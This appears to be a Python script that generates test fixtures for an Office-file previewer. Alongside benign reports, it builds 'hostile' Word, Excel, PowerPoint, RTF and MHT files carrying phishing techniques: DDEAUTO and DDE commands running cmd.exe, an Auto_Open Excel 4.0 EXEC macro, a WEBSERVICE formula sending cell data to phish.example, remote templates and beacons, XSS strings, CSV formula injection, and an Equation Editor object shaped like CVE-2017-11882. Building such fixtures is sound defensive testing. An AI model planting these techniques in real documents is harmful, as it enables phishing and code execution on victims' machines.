# Copyright 2026- Seongwoo Hong. All rights reserved.
"""
The Office preview fixtures (commit 42b, docs/PREVIEWS.md), made, not
downloaded: every byte is ours. Run from anywhere:

    python3 -I tests/fixtures/preview/office.py tests/fixtures/preview

(then `node tests/fixtures/preview/ole.mjs tests/fixtures/preview` for the
한글 files and the OLE surgery — it reads two of the files made here).

report.docx   two pages (a page break): a heading, a table, a picture;
              page two in Korean. Title and author in its properties.
hostile.docx  what a phishing document carries, all at once: a macro
              project (under a .docx name), a template fetched from a
              server on open, a DDEAUTO field that runs cmd.exe, an
              INCLUDEPICTURE beacon, a picture linked from a \\\\server path,
              an embedded object, an altChunk of HTML with a <script>,
              hidden text, a tracked change that swaps a bank account,
              markup typed as text, and a link to a credential page.
report.xlsx   two sheets: a summary (a merged title, Korean, a formula)
              and 400 rows of data (the reader draws rows as they scroll in).
hostile.xlsx  hidden and VERY hidden sheets, an Excel 4.0 (XLM) macro sheet
              run by _xlnm.Auto_Open, a macro project, a DDE formula, a
              WEBSERVICE formula, a web query, a link to an outside
              workbook on a \\\\server path, a link to a credential page.
ledger.csv    Korean, in the code page Korean Excel saves CSV in (CP949),
              with one cell that a spreadsheet would run as a formula.
report.pptx   three slides (Korean on two), speaker notes, a table, a picture.
hostile.pptx  a slide whose TEXT is `<img src=x onerror=…>` (the reader's
              library writes slide text as HTML — the frame's default
              Trusted Types policy must clean it), a "Run program" action
              (ppaction://program → cmd.exe), a hidden slide, a picture
              linked from outside, a macro project, an embedded object, a
              link to a credential page.
hostile.rtf   the RTF lure: an Equation Editor 3.0 object set to update on
              open (CVE-2017-11882's shape), a DDEAUTO field, a template
              fetched from a server, a link.
statement.mht a web archive with a script, a tracking picture and a link —
              sent as "statement.doc", Word opens it.
report.doc, report.ppt, report.rtf, report.odt, report.odp, report.xls,
report.ods, hostile.doc
              report.docx, report.pptx, report.xlsx and hostile.docx saved by LibreOffice
              in the older formats (the only fixtures whose bytes vary run
              to run: LibreOffice stamps them). ole.mjs then adds to
              hostile.doc what LibreOffice would not write: a macro project,
              an Equation Editor object, a packaged program.

Everything else is the same bytes on every run: fixed dates in the
properties, fixed timestamps in the ZIPs.
"""

import io
import os
import re
import shutil
import subprocess
import sys
import tempfile
import zipfile
from datetime import datetime
from pathlib import Path

import docx
import openpyxl
import pptx
from docx.shared import Inches
from openpyxl.workbook.defined_name import DefinedName
from PIL import Image, ImageDraw
from pptx.util import Inches as PInches, Pt

out = Path(sys.argv[1])
out.mkdir(parents=True, exist_ok=True)
WHEN = datetime(2026, 1, 2, 3, 4, 5)
STAMP = "2026-01-02T03:04:05Z"


def png() -> io.BytesIO:
    """A small picture: a green field with a white bar (no metadata, so the same bytes)."""
    im = Image.new("RGB", (240, 120), (34, 139, 34))
    ImageDraw.Draw(im).rectangle((20, 50, 220, 70), fill=(255, 255, 255))
    b = io.BytesIO()
    im.save(b, "PNG", optimize=False)
    b.seek(0)
    return b


def rezip(data: bytes, put: dict | None = None, edit: dict | None = None) -> bytes:
    """Rewrite a ZIP with fixed timestamps; `put` adds or replaces parts,
    `edit` rewrites a part's text."""
    put = dict(put or {})
    edit = edit or {}
    src = zipfile.ZipFile(io.BytesIO(data))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        def write(name: str, body: bytes) -> None:
            if name in edit:
                body = edit[name](body.decode("utf-8")).encode("utf-8")
            zi = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            zi.compress_type = zipfile.ZIP_DEFLATED
            zi.external_attr = 0o644 << 16
            z.writestr(zi, body)

        for name in src.namelist():
            if name.startswith("docProps/thumbnail"):
                continue
            write(name, put.pop(name) if name in put else src.read(name))
        for name, body in put.items():
            write(name, body)
    return buf.getvalue()


def fixed_core(xml: str) -> str:
    xml = re.sub(r"(<dcterms:created[^>]*>)[^<]*", rf"\g<1>{STAMP}", xml)
    return re.sub(r"(<dcterms:modified[^>]*>)[^<]*", rf"\g<1>{STAMP}", xml)


def no_thumbnail(xml: str) -> str:
    return re.sub(r'<Relationship [^>]*Target="docProps/thumbnail[^"]*"/>', "", xml)


def add_rels(xml: str, *rels: str) -> str:
    return xml.replace("</Relationships>", "".join(rels) + "</Relationships>")


def add_types(xml: str, *types: str) -> str:
    # As Office writes it: every Default before the first Override (some
    # readers' parsers depend on that order).
    defaults = "".join(t for t in types if t.startswith("<Default"))
    overrides = "".join(t for t in types if not t.startswith("<Default"))
    xml = re.sub(r"(<Types\b[^>]*>)", lambda m: m.group(1) + defaults, xml, count=1)
    return xml.replace("</Types>", overrides + "</Types>")


def saved(obj) -> bytes:
    b = io.BytesIO()
    obj.save(b)
    return b.getvalue()


R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
BASE_EDIT = {"docProps/core.xml": fixed_core, "_rels/.rels": no_thumbnail}

# ── Word ────────────────────────────────────────────────────────────────

d = docx.Document()
d.core_properties.title = "Quarterly report"
d.core_properties.author = "Gorani tests"
d.core_properties.last_modified_by = "Gorani tests"
d.core_properties.created = WHEN
d.core_properties.modified = WHEN
d.core_properties.revision = 1
d.add_heading("Gorani Word page one", 1)
d.add_paragraph("The quarter closed with every case accounted for.")
t = d.add_table(rows=3, cols=3)
t.style = "Table Grid"
for r, row in enumerate([("Case", "Owner", "Status"), ("Lake", "Rin", "Closed"), ("River", "Mo", "Open")]):
    for c, text in enumerate(row):
        t.cell(r, c).text = text
d.add_picture(png(), width=Inches(1.5))
d.add_page_break()
d.add_heading("고라니 보고서 둘째 쪽", 1)
d.add_paragraph("Gorani Word page two")
report_docx = rezip(saved(d), edit={**BASE_EDIT, "docProps/app.xml": lambda x: x.replace("<Pages>1</Pages>", "<Pages>2</Pages>")})
(out / "report.docx").write_bytes(report_docx)

h = docx.Document()
h.core_properties.title = "Invoice"
h.core_properties.author = "Accounts"
h.core_properties.last_modified_by = "phisher"
h.core_properties.created = WHEN
h.core_properties.modified = WHEN
h.add_heading("Invoice overdue", 1)
p = h.add_paragraph("Enable editing to see the invoice. ")
hidden = p.add_run("gorani hidden instruction")
hidden.font.hidden = True
h.add_paragraph("<img src=x onerror=alert('docx')>")


def field(code: str, shown: str) -> str:
    return (
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve">{code}</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        f"<w:r><w:t>{shown}</w:t></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )


body_extra = (
    field(' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" ', "Loading the invoice")
    + field(' INCLUDEPICTURE "http://phish.example/track.png" \\d ', "")
    + '<w:p><w:hyperlink r:id="rIdLink"><w:r><w:t>Pay the invoice</w:t></w:r></w:hyperlink></w:p>'
    + '<w:p><w:r><w:t xml:space="preserve">Account: </w:t></w:r>'
    + f'<w:del w:id="91" w:author="phisher" w:date="{STAMP}"><w:r><w:delText>DE89 3704 0044 0532 0130 00</w:delText></w:r></w:del>'
    + f'<w:ins w:id="92" w:author="phisher" w:date="{STAMP}"><w:r><w:t>GB33 BUKB 2020 1555 5555 55</w:t></w:r></w:ins></w:p>'
    + '<w:altChunk r:id="rIdAlt"/>'
)
hostile_docx = rezip(
    saved(h),
    put={
        "word/vbaProject.bin": b"gorani fixture: not a real VBA project\n",
        "word/embeddings/oleObject1.bin": b"gorani fixture: not a real OLE object\n",
        "word/afchunk.html": b"<html><body><script>alert('altchunk ran')</script><p>gorani altchunk</p></body></html>",
        "word/_rels/settings.xml.rels": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f'<Relationship Id="rIdTpl" Type="{R}/attachedTemplate" Target="https://phish.example/template.dotm" TargetMode="External"/>'
            "</Relationships>"
        ).encode(),
    },
    edit={
        **BASE_EDIT,
        "word/document.xml": lambda x: x.replace("<w:sectPr", body_extra + "<w:sectPr", 1),
        "word/settings.xml": lambda x: re.sub(r"(<w:settings\b[^>]*>)", r'\1<w:attachedTemplate r:id="rIdTpl"/>', x, count=1),
        "word/_rels/document.xml.rels": lambda x: add_rels(
            x,
            f'<Relationship Id="rIdLink" Type="{R}/hyperlink" Target="https://phish.example/login" TargetMode="External"/>',
            f'<Relationship Id="rIdAlt" Type="{R}/aFChunk" Target="afchunk.html"/>',
            f'<Relationship Id="rIdBeacon" Type="{R}/image" Target="\\\\phish.example\\share\\logo.png" TargetMode="External"/>',
            f'<Relationship Id="rIdOle" Type="{R}/oleObject" Target="embeddings/oleObject1.bin"/>',
            '<Relationship Id="rIdVba" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>',
        ),
        "[Content_Types].xml": lambda x: add_types(
            x,
            '<Default Extension="html" ContentType="text/html"/>',
            '<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
            '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        ),
    },
)
(out / "hostile.docx").write_bytes(hostile_docx)

# ── Excel ───────────────────────────────────────────────────────────────

wb = openpyxl.Workbook()
ws = wb.active
ws.title = "Summary"
ws["A1"] = "Gorani sheet one"
ws.merge_cells("A1:C1")
for r, row in enumerate([("Case", "Owner", "Amount"), ("Lake", "고라니", 1200), ("River", "Rin", 340.5), ("Hill", "Mo", 87)], start=2):
    for c, v in enumerate(row, start=1):
        ws.cell(row=r, column=c, value=v)
ws["B6"] = "Total"
ws["C6"] = "=SUM(C3:C5)"
ws.column_dimensions["B"].width = 18
data = wb.create_sheet("Data")
data.append(("N", "Label", "Triple"))
for i in range(1, 401):
    data.append((i, f"row {i}", i * 3))
wb.properties.creator = "Gorani tests"
wb.properties.title = "Quarterly sheet"
wb.properties.created = WHEN
wb.properties.modified = WHEN
(out / "report.xlsx").write_bytes(rezip(saved(wb), edit=BASE_EDIT))

hw = openpyxl.Workbook()
inv = hw.active
inv.title = "Invoice"
inv["A1"] = "Invoice overdue"
inv["A2"] = "Enable content to see the amount"
inv["A3"] = "=cmd|' /C calc'!A0"
inv["A4"] = '=WEBSERVICE("https://phish.example/x?d="&A1)'
inv["A5"] = "Pay here"
inv["A5"].hyperlink = "https://phish.example/login"
hid = hw.create_sheet("Hidden")
hid.sheet_state = "hidden"
hid["A1"] = "hidden sheet text"
sec = hw.create_sheet("Secret")
sec.sheet_state = "veryHidden"
sec["A1"] = "very hidden sheet text"
hw.properties.creator = "Accounts"
hw.properties.created = WHEN
hw.properties.modified = WHEN

MACRO = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
    'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">'
    '<sheetData><row r="1"><c r="A1"><f>EXEC("calc.exe")</f></c></row><row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData>'
    "</xm:macrosheet>"
)
EXTERNAL = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<externalBook r:id="rId1"><sheetNames><sheetName val="Rates"/></sheetNames></externalBook></externalLink>'
)


def workbook_xml(x: str) -> str:
    x = x.replace("</sheets>", '<sheet name="Macro1" sheetId="9" state="hidden" r:id="rIdMacro"/></sheets><externalReferences><externalReference r:id="rIdExt"/></externalReferences>', 1)
    names = '<definedName name="_xlnm.Auto_Open" hidden="1">Macro1!$A$1</definedName>'
    if "<definedNames>" in x:
        return x.replace("<definedNames>", "<definedNames>" + names, 1)
    return x.replace("<calcPr", f"<definedNames>{names}</definedNames><calcPr", 1)


hostile_xlsx = rezip(
    saved(hw),
    put={
        "xl/vbaProject.bin": b"gorani fixture: not a real VBA project\n",
        "xl/macrosheets/sheet1.xml": MACRO.encode(),
        "xl/connections.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            '<connection id="1" name="Rates" type="4" refreshedVersion="6" background="1" saveData="1"><webPr url="https://phish.example/rates.iqy" htmlTables="1"/></connection>'
            "</connections>"
        ).encode(),
        "xl/externalLinks/externalLink1.xml": EXTERNAL.encode(),
        "xl/externalLinks/_rels/externalLink1.xml.rels": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f'<Relationship Id="rId1" Type="{R}/externalLinkPath" Target="\\\\phish.example\\share\\book.xlsx" TargetMode="External"/>'
            "</Relationships>"
        ).encode(),
    },
    edit={
        **BASE_EDIT,
        "xl/workbook.xml": workbook_xml,
        "xl/_rels/workbook.xml.rels": lambda x: add_rels(
            x,
            '<Relationship Id="rIdMacro" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/>',
            f'<Relationship Id="rIdExt" Type="{R}/externalLink" Target="externalLinks/externalLink1.xml"/>',
            f'<Relationship Id="rIdConn" Type="{R}/connections" Target="connections.xml"/>',
            '<Relationship Id="rIdVba" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>',
        ),
        "[Content_Types].xml": lambda x: add_types(
            x,
            '<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
            '<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
            '<Override PartName="/xl/connections.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml"/>',
            '<Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>',
        ),
    },
)
(out / "hostile.xlsx").write_bytes(hostile_xlsx)

(out / "ledger.csv").write_bytes('이름,금액,메모\r\n고라니,1200,정상\r\nRin,340,"=HYPERLINK(""https://phish.example/login"",""확인"")"\r\n'.encode("cp949"))

# ── PowerPoint ──────────────────────────────────────────────────────────

pr = pptx.Presentation()
pr.core_properties.title = "Quarterly review"
pr.core_properties.author = "Gorani tests"
pr.core_properties.last_modified_by = "Gorani tests"
pr.core_properties.created = WHEN
pr.core_properties.modified = WHEN
pr.core_properties.revision = 1
s1 = pr.slides.add_slide(pr.slide_layouts[0])
s1.shapes.title.text = "Gorani slides page one"
s1.placeholders[1].text = "Quarterly review"
s1.notes_slide.notes_text_frame.text = "Speaker notes for slide one"
s2 = pr.slides.add_slide(pr.slide_layouts[1])
s2.shapes.title.text = "고라니 둘째 장"
s2.placeholders[1].text = "Gorani slide two"
s3 = pr.slides.add_slide(pr.slide_layouts[5])
s3.shapes.title.text = "Gorani slide three"
tbl = s3.shapes.add_table(3, 2, PInches(1), PInches(2), PInches(6), PInches(1.5)).table
for r, row in enumerate([("Case", "Status"), ("Lake", "Closed"), ("River", "Open")]):
    for c, text in enumerate(row):
        tbl.cell(r, c).text = text
s3.shapes.add_picture(png(), PInches(1), PInches(4), width=PInches(2))
(out / "report.pptx").write_bytes(rezip(saved(pr), edit=BASE_EDIT))

hp = pptx.Presentation()
hp.core_properties.title = "Invoice"
hp.core_properties.author = "Accounts"
hp.core_properties.last_modified_by = "phisher"
hp.core_properties.created = WHEN
hp.core_properties.modified = WHEN
a = hp.slides.add_slide(hp.slide_layouts[5])
a.shapes.title.text = "Invoice overdue"
box = a.shapes.add_textbox(PInches(1), PInches(2), PInches(8), PInches(1)).text_frame
box.text = "<img src=x onerror=alert('pptx')>"
link = a.shapes.add_textbox(PInches(1), PInches(3), PInches(8), PInches(1)).text_frame.paragraphs[0].add_run()
link.text = "Pay the invoice"
link.hyperlink.address = "https://phish.example/login"
run = a.shapes.add_textbox(PInches(1), PInches(4), PInches(8), PInches(1)).text_frame.paragraphs[0].add_run()
run.text = "Open the attachment"
run.font.size = Pt(20)
run.hyperlink.address = "file:///C:/Windows/System32/cmd.exe"
b = hp.slides.add_slide(hp.slide_layouts[5])
b.shapes.title.text = "hidden slide text"
PIC = (
    '<p:pic><p:nvPicPr><p:cNvPr id="99" name="Beacon"/><p:cNvPicPr/><p:nvPr/></p:nvPicPr>'
    '<p:blipFill><a:blip r:link="rIdBeacon"/><a:stretch><a:fillRect/></a:stretch></p:blipFill>'
    '<p:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="12700" cy="12700"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr></p:pic>'
)


def slide1(x: str) -> str:
    return x.replace("</p:spTree>", PIC + "</p:spTree>", 1)


def slide1_rels(x: str) -> str:
    # The cmd.exe link becomes a "Run program" action, as PowerPoint saves one.
    return add_rels(
        x,
        f'<Relationship Id="rIdBeacon" Type="{R}/image" Target="https://phish.example/beacon.png" TargetMode="External"/>',
        f'<Relationship Id="rIdOle" Type="{R}/oleObject" Target="../embeddings/oleObject1.bin"/>',
    )


raw = saved(hp)
rels1 = zipfile.ZipFile(io.BytesIO(raw)).read("ppt/slides/_rels/slide1.xml.rels").decode()
cmd_rid = re.search(r'Id="(rId\d+)"[^>]*Target="file:///C:/Windows/System32/cmd.exe"', rels1).group(1)
hostile_pptx = rezip(
    raw,
    put={
        "ppt/vbaProject.bin": b"gorani fixture: not a real VBA project\n",
        "ppt/embeddings/oleObject1.bin": b"gorani fixture: not a real OLE object\n",
    },
    edit={
        **BASE_EDIT,
        "ppt/slides/slide1.xml": lambda x: slide1(x).replace(f'<a:hlinkClick r:id="{cmd_rid}"/>', f'<a:hlinkClick r:id="{cmd_rid}" action="ppaction://program"/>'),
        "ppt/slides/slide2.xml": lambda x: x.replace("<p:sld ", '<p:sld show="0" ', 1),
        "ppt/slides/_rels/slide1.xml.rels": slide1_rels,
        "ppt/_rels/presentation.xml.rels": lambda x: add_rels(x, '<Relationship Id="rIdVba" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>'),
        "[Content_Types].xml": lambda x: add_types(
            x,
            '<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
            '<Override PartName="/ppt/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        ),
    },
)
(out / "hostile.pptx").write_bytes(hostile_pptx)

# ── RTF ─────────────────────────────────────────────────────────────────

(out / "hostile.rtf").write_bytes(
    (
        r"{\rtf1\ansi\ansicpg1252\deff0{\fonttbl{\f0 Arial;}}"
        r"{\info{\title Invoice}{\author Accounts}}"
        r"{\*\template https://phish.example/template.dotm}"
        r"\f0\fs28 Invoice overdue\par "
        r"Enable editing to see the invoice.\par "
        r'{\field{\*\fldinst DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}{\fldrslt Loading}}\par '
        r'{\field{\*\fldinst HYPERLINK "https://phish.example/login"}{\fldrslt Pay the invoice}}\par '
        r"{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000006761726e690000000000}{\result {\pict\wmetafile8\picw10\pich10 0100}}}\par "
        "}"
    ).encode("ascii")
)

# ── A web archive (MHT), the kind sent as "statement.doc" ───────────────

(out / "statement.mht").write_bytes(
    (
        "MIME-Version: 1.0\r\n"
        'Content-Type: multipart/related; boundary="----=_gorani"\r\n\r\n'
        "------=_gorani\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Content-Transfer-Encoding: quoted-printable\r\n"
        "Content-Location: file:///C:/statement.htm\r\n\r\n"
        "<html><head><title>Statement</title></head><body>"
        "<p>Your statement is ready</p>"
        '<img src=3D"https://phish.example/open.gif">'
        "<script>alert('mht ran')</script>"
        '<p><a href=3D"https://phish.example/login">View the statement</a></p>'
        "</body></html>\r\n"
        "------=_gorani--\r\n"
    ).encode("ascii")
)

# ── The older formats, saved by LibreOffice ─────────────────────────────

soffice = shutil.which("soffice") or shutil.which("libreoffice")
if soffice:
    with tempfile.TemporaryDirectory() as tmp:
        profile = Path(tmp) / "profile"
        src = Path(tmp) / "src"
        src.mkdir()
        (src / "report.docx").write_bytes(report_docx)
        (src / "report.pptx").write_bytes((out / "report.pptx").read_bytes())
        (src / "hostile.docx").write_bytes(hostile_docx)
        (src / "report.xlsx").write_bytes((out / "report.xlsx").read_bytes())
        for name, fmt in [("report.docx", "doc:MS Word 97"), ("hostile.docx", "doc:MS Word 97"), ("report.xlsx", "xls:MS Excel 97"), ("report.xlsx", "ods"), ("report.docx", "rtf"), ("report.docx", "odt"), ("report.pptx", "ppt:MS PowerPoint 97"), ("report.pptx", "odp")]:
            subprocess.run(
                [soffice, f"-env:UserInstallation=file://{profile}", "--headless", "--convert-to", fmt, "--outdir", str(out), str(src / name)],
                check=True,
                capture_output=True,
                env={**os.environ, "HOME": tmp},
                timeout=180,
            )
else:
    print("(no LibreOffice: report.doc/.ppt/.rtf/.odt/.odp not remade)")

for name in sorted(p.name for p in out.iterdir() if p.suffix in {".docx", ".xlsx", ".pptx", ".csv", ".rtf", ".doc", ".ppt", ".odt", ".odp", ".mht", ".xls", ".ods"}):
    print(f"{name}: {(out / name).stat().st_size} bytes")
